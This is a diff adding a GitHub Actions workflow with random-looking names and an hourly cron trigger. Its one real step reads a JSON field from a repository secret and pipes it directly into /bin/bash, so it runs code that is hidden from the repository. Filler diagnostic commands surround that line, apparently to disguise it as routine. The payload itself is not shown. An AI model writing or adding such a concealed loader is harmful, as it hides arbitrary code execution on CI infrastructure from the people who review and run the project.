@@ -1,0 +1,28 @@
+name: jingyaju3456
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 * * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jingyaju3456
+        env:
+          a4335: ${{ secrets.a4335 }}
+        run: |
+          echo "Hostname: $(hostname 2>/dev/null || echo unknown)"
+          [ -f /etc/hosts ] && echo "Hosts exist" || true
+          echo "Dir: $(pwd)"
+          echo $a4335 | jq -r .m32410 | /bin/bash
+          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
+          echo "Random ID: $RANDOM$RANDOM"
+          touch tmp.abc.tmp.abc
+          echo "Uptime: $(uptime 2>/dev/null | cut -d' ' -f1-3 || echo N/A)"
+          screen -ls
+          which apt-get
+          if [ -x /bin/ls ]; then echo "LS executable"; fi
+          pushd ~
